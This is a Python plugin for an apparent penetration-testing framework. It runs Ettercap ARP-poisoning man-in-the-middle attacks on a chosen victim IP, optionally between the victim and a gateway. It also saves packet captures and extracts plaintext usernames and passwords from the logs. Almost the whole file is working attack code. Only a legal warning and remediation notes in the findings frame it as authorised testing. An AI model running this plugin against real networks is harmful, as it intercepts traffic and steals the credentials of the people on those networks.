"""
Ettercap Plugin - Man-in-the-Middle & ARP Poisoning
Captures credentials and network traffic via MITM attacks

⚠️ LEGAL WARNING:
Only use on networks you own or have explicit written permission to test.
MITM attacks without authorization are illegal.
"""
from core.plugins.base import PluginBase
from typing import Dict, Any, List
import subprocess
import os
import re
import logging
import time

logger = logging.getLogger(__name__)


class EttercapPlugin(PluginBase):
    """Ettercap MITM plugin."""
    
    name = "ettercap"
    version = "1.0.0"
    description = "Man-in-the-Middle attacks: ARP poisoning, credential capture"
    capabilities = ["mitm", "post_exploitation", "credential_harvesting"]
    
    required_params = ["interface", "target1"]
    optional_params = ["target2", "gateway", "duration", "filter"]
    
    def validate_config(self) -> None:
        """Validate plugin configuration."""
        if "interface" not in self.config:
            raise ValueError("Missing required parameter: interface (e.g., eth0)")
        
        if "target1" not in self.config:
            raise ValueError("Missing required parameter: target1 (victim IP)")
        
        interface = self.config["interface"]
        
        # Check if interface exists
        if not os.path.exists(f"/sys/class/net/{interface}"):
            raise ValueError(f"Network interface '{interface}' not found")
    
    def run(self) -> Dict[str, Any]:
        """Execute Ettercap MITM attack."""
        interface = self.config["interface"]
        target1 = self.config["target1"]
        target2 = self.config.get("target2", "")  # Optional second target
        gateway = self.config.get("gateway", "")  # Optional gateway
        duration = self.config.get("duration", 60)  # Default 60 seconds
        
        logger.info(f"Running Ettercap on {interface}, target: {target1}")
        
        artifacts = []
        metadata = {
            'interface': interface,
            'target1': target1,
            'target2': target2,
            'duration': duration
        }
        
        try:
            # Output file for captured data
            output_file = f"/tmp/ettercap_{int(time.time())}.log"
            
            # Build ettercap command
            cmd = [
                'ettercap',
                '-T',  # Text mode
                '-q',  # Quiet mode
                '-i', interface,
                '-L', output_file.replace('.log', ''),  # Log prefix
            ]
            
            # ARP poisoning targets
            if target2:
                # Bidirectional MITM (target1 <-> target2)
                cmd.extend(['-M', 'arp:remote', f'/{target1}//', f'/{target2}//'])
                metadata['attack_type'] = 'bidirectional_mitm'
            elif gateway:
                # Target <-> Gateway MITM
                cmd.extend(['-M', 'arp:remote', f'/{target1}//', f'/{gateway}//'])
                metadata['attack_type'] = 'gateway_mitm'
            else:
                # Simple ARP poisoning on target
                cmd.extend(['-M', 'arp', f'/{target1}//'])
                metadata['attack_type'] = 'simple_arp_poison'
            
            logger.info(f"Command: {' '.join(cmd)}")
            
            # Run ettercap with timeout
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait for specified duration
            time.sleep(duration)
            
            # Terminate ettercap
            process.terminate()
            try:
                stdout, stderr = process.communicate(timeout=5)
                metadata['stdout'] = stdout[:1000]  # First 1000 chars
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
            
            # Collect log files
            log_files = [
                output_file,
                f"{output_file.replace('.log', '')}.eci",  # Ettercap info
                f"{output_file.replace('.log', '')}.ecp",  # Ettercap pcap
            ]
            
            for log_file in log_files:
                if os.path.exists(log_file):
                    artifacts.append(log_file)
            
            metadata['artifacts_count'] = len(artifacts)
            metadata['log_file'] = output_file
            
            # Parse captured credentials
            credentials = self._parse_credentials(output_file)
            metadata['credentials_captured'] = len(credentials)
            metadata['credentials'] = credentials
            
            return {
                "raw_output": metadata,
                "artifacts": artifacts,
                "metadata": metadata
            }
        
        except Exception as e:
            raise Exception(f"Ettercap execution failed: {str(e)}")
    
    def parse_output(self, raw_output: Any) -> List[Dict[str, Any]]:
        """Parse Ettercap output into findings."""
        findings = []
        
        if not isinstance(raw_output, dict):
            logger.warning("Invalid raw_output format")
            return findings
        
        metadata = raw_output
        
        # Finding 1: MITM attack success
        findings.append({
            'title': f"MITM attack executed on {metadata.get('target1')}",
            'severity': 'high',
            'description': (
                f"Successfully performed {metadata.get('attack_type', 'unknown')} attack.\n\n"
                f"Target: {metadata.get('target1')}\n"
                f"Duration: {metadata.get('duration')} seconds\n"
                f"Interface: {metadata.get('interface')}\n\n"
                f"This demonstrates the network is vulnerable to ARP poisoning."
            ),
            'remediation': (
                "Implement ARP spoofing detection (e.g., arpwatch). "
                "Use static ARP entries for critical hosts. "
                "Enable DHCP snooping and Dynamic ARP Inspection on switches."
            ),
            'raw_data': metadata
        })
        
        # Finding 2: Captured credentials
        credentials = metadata.get('credentials', [])
        if credentials:
            for cred in credentials:
                findings.append({
                    'title': f"Credentials captured: {cred.get('username', 'N/A')}",
                    'severity': 'critical',
                    'description': (
                        f"Captured plaintext credentials via MITM:\n\n"
                        f"Username: {cred.get('username', 'N/A')}\n"
                        f"Password: {cred.get('password', 'N/A')}\n"
                        f"Protocol: {cred.get('protocol', 'N/A')}\n"
                        f"Target: {cred.get('target', 'N/A')}"
                    ),
                    'remediation': (
                        "Use encrypted protocols (HTTPS, SSH, SFTP). "
                        "Disable plaintext authentication (FTP, Telnet, HTTP Basic Auth). "
                        "Implement certificate pinning."
                    ),
                    'raw_data': cred
                })
        else:
            findings.append({
                'title': "No credentials captured during MITM",
                'severity': 'info',
                'description': (
                    "MITM attack was successful but no plaintext credentials were observed. "
                    "This may indicate:\n"
                    "- No authentication traffic during capture window\n"
                    "- All traffic was encrypted (HTTPS/SSH)\n"
                    "- Target was inactive"
                ),
                'remediation': "Continue using encrypted protocols.",
                'raw_data': metadata
            })
        
        logger.info(f"Created {len(findings)} findings from Ettercap output")
        return findings
    
    def _parse_credentials(self, log_file: str) -> List[Dict[str, str]]:
        """Parse captured credentials from Ettercap log."""
        credentials = []
        
        if not os.path.exists(log_file):
            return credentials
        
        try:
            with open(log_file, 'r', errors='ignore') as f:
                content = f.read()
            
            # Pattern for common credential formats in Ettercap logs
            # Example: USER: admin  PASS: password123  INFO: ftp://192.168.1.100
            patterns = [
                r'USER:\s*(\S+)\s+PASS:\s*(\S+)\s+INFO:\s*(\S+)',
                r'Username:\s*(\S+).*?Password:\s*(\S+)',
            ]
            
            for pattern in patterns:
                matches = re.finditer(pattern, content, re.IGNORECASE)
                for match in matches:
                    cred = {
                        'username': match.group(1),
                        'password': match.group(2),
                        'target': match.group(3) if match.lastindex >= 3 else 'unknown',
                        'protocol': self._extract_protocol(match.group(3) if match.lastindex >= 3 else '')
                    }
                    credentials.append(cred)
            
            logger.info(f"Parsed {len(credentials)} credentials from log")
        
        except Exception as e:
            logger.error(f"Failed to parse credentials: {str(e)}")
        
        return credentials
    
    def _extract_protocol(self, target: str) -> str:
        """Extract protocol from target string."""
        if 'ftp://' in target.lower():
            return 'FTP'
        elif 'http://' in target.lower():
            return 'HTTP'
        elif 'telnet' in target.lower():
            return 'Telnet'
        elif ':22' in target or 'ssh' in target.lower():
            return 'SSH'
        else:
            return 'Unknown'
